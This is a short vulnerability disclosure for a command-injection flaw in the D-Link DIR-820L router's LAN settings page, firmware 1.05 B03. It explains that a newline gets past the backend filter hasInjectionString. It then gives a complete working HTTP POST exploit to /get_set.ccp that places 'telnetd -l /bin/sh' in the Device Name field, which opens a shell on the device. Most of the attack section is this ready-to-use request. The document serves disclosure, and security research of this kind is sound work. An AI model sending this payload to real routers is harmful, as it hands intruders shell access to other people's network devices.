# D-Link DIR-820L command_execution

**Vender**: D-Link

**Vendor Homepage**: http://www.dlink.com.cn/

**Affect products**: DIR-820L

**Firmware version**: 1.05 B03

**Hardware Link**: http://www.dlinktw.com.tw/techsupport/download.ashx?file=2663

**Exploit Author**: [SkYe231@Hillstone](mailto:ext-lhliang@Hillstonenet.com), Akast@Hillstone, GD@Hillstone, Amao@Hillstone

## detail

In the handler of route `/lan.asp`, the value of parameter `Device Name` can inject command

![image-20220222165316794](img/image-20220222165316794.png)

Parameters are filtered on both the front-end and the back-end. 

**Grab traffic packets to bypass front-end filtering.** 

**The backend filter function is: `hasInjectionString` (in file `lib/libleopard.so`).The symbol `\n` is not filtered.**

## EXP

Edit the value of `lanHostCfg_DeviceName_1.1.1.0` to the command what you want to inject. Such as:

> lanHostCfg_DeviceName_1.1.1.0=%0atelnetd -l /bin/sh%0a

```html
POST /get_set.ccp HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:97.0) Gecko/20100101 Firefox/97.0
Accept: application/xml, text/xml, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Content-Length: 768
Origin: http://192.168.0.1
Connection: close
Referer: http://192.168.0.1/lan.asp
Cookie: hasLogin=1

ccp_act=set&old_ip=192.168.0.1&old_mask=255.255.255.0&new_ip=192.168.0.1&new_mask=255.255.255.0&nextPage=lan.asp&lanHostCfg_IPAddress_1.1.1.0=192.168.0.1&lanHostCfg_SubnetMask_1.1.1.0=255.255.255.0&lanHostCfg_DomainName_1.1.1.0=&lanHostCfg_DNSRelay_1.1.1.0=1&lanHostCfg_DHCPServerEnable_1.1.1.0=1&lanHostCfg_MinAddress_1.1.1.0=192.168.0.100&lanHostCfg_MaxAddress_1.1.1.0=192.168.0.200&lanHostCfg_DHCPLeaseTime_1.1.1.0=1440&lanHostCfg_DeviceName_1.1.1.0=%0atelnetd -l /bin/sh%0a&lanHostCfg_AlwaysBroadcast_1.1.1.0=0&lanHostCfg_NetBIOSAnnouncement_1.1.1.0=0&lanHostCfg_NetBIOSLearn_1.1.1.0=0&lanHostCfg_NetBIOSScope_1.1.1.0=&lanHostCfg_NetBIOSNodeType_1.1.1.0=2&lanHostCfg_PrimaryWINSAddress_1.1.1.0=0.0.0.0&lanHostCfg_SecondaryWINSAddress_1.1.1.0=0.0.0.0&1645537536373=1645537536373
```

